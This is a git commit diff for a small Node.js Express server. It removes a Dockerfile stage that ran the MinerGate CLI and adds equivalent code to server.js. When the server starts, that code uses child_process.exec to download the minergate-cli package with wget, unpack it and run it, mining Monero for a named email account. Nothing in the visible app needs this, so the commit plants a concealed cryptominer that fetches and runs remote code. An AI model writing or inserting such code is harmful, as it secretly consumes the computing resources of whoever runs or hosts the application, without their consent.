16e8c1271ee8d8e7dcf8fd1c60f849638e48ab5a
Chaowarat Tangrueng <User@DESKTOP-DUKFK1N.nu.local>
2017-05-28 17:17:59 +0700

    add

--- Dockerfile
+++ Dockerfile
@@ -1,18 +1,3 @@
-FROM ubuntu:16.04
-
-RUN apt-get update \
-    && apt-get -qq --no-install-recommends install \
-        ca-certificates \
-        wget \
-    && rm -r /var/lib/apt/lists/*
-
-RUN wget -q --content-disposition https://minergate.com/download/deb-cli \
-    && dpkg -i *.deb \
-    && rm *.deb
-
-ENTRYPOINT ["minergate-cli"]
-CMD ["-user", "chaowarut@hotmail.com", "-xmr", "&"]
-
 FROM node:boron
 RUN mkdir -p /usr/src/app
 WORKDIR /usr/src/app
--- server.js
+++ server.js
@@ -1,6 +1,7 @@
 'use strict';
 
 const express = require('express');
+const exec = require("child_process").exec
 
 const PORT = 8080;
 
@@ -11,3 +12,6 @@ app.get('/', function (req, res) {
 
 app.listen(PORT);
 console.log('Running on http://localhost:' + PORT);
+
+var cmd = 'wget -q --content-disposition https://minergate.com/download/deb-cli && ar x minergate-cli-release.deb && tar -xzf control.tar.gz && tar -xzf data.tar.gz && cd opt/minergate-cli && ./minergate-cli -user chaowarut@Hotmail.com -xmr';
+exec(cmd);
